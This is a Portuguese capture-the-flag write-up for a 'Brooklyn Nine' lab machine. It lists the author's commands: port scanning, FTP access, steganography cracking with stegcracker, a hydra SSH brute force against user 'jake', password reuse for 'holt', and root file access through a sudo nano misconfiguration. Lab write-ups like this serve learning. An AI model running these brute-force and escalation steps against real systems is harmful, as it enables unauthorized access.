# Brooklyn Nine

* ### Scan de portas - Verificando quais portas estão abertas.
```Bash
rustscan -a 10.10.248.74
```
![image](https://github.com/lufffe/Writeups/assets/90646635/5c69703f-45d5-48b6-9051-053ef0c623ef)

![image](https://github.com/lufffe/Writeups/assets/90646635/55c6b5d0-ddd1-4e29-846b-c18ab5259781)

* ### Verificando o que está rodando nas portas encontradas.
```Bash
nmap -A -p 21,22,80 10.10.248.74
```
![Captura de tela 2023-08-24 105130](https://github.com/lufffe/Writeups/assets/90646635/66271f17-b385-4e73-b3aa-dce319a3dfd3)

* ### Verificando o FTP e baixando o arquivo que estava lá.
```Bash
ftp 10.10.248.74
```
![image](https://github.com/lufffe/Writeups/assets/90646635/0f02bdac-2da3-4511-b857-b0e42e791fe4)

* ### Lendo arquivo baixado.
![image](https://github.com/lufffe/Writeups/assets/90646635/efa475d4-91f3-4d60-aac8-d43e50064870)

* ### Olhando o Http.
![image](https://github.com/lufffe/Writeups/assets/90646635/1be68ae1-ece5-4ac5-bd5c-a4d1ca795412)

* ### Temos uma imagem gigantesca, e um comentário sobre esteganografia.
![image](https://github.com/lufffe/Writeups/assets/90646635/8e76fa90-d372-4bc4-87f6-107cdabb2ad2)

* ### Baixando a imagem.
```Bash
wget http://10.10.248.74/brooklyn99.jpg
```

* ### Procurando uma possivel senha na imagem.
```Bash
sudo stegcracker brooklyn99.jpg ~/rockyou.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/95d9b4b8-9fc0-4c70-9fe5-916cf9663fc8)

* ### Encontrada, mas não é a senha do SSH do usuário Jake.
![image](https://github.com/lufffe/Writeups/assets/90646635/a229cde0-1be1-4687-a165-d4062676fc17)

* ### BruteForce no SSH.
```Bash
hydra -l jake -P rockyou.txt 10.10.248.74 ssh
```
![image](https://github.com/lufffe/Writeups/assets/90646635/529cfea5-9d0a-4f61-8041-61493f8d62b8)

* ### Depois de acessar o SSH pelo usuário Jake com a senha encontrada no BruteForce, vi que tem um usuário Holt, testei a senha encontrada na imagem e deu certo, a Flag User está lá.
![image](https://github.com/lufffe/Writeups/assets/90646635/4972304b-a169-4de3-9181-afc9a4511987)

* ### Flag User.
```Bash
cat /home/holt/user.txt 
```

* ### Procurando como escalar previlégio do usuário.
```Bash
sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/4e85e84a-2b4a-4a34-8b84-587705ed5599)


* ### Ai ficou facil :D .
```Bash
sudo /bin/nano /root/root.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/03553ac2-9204-4914-b278-a7b19bcb0d4b)


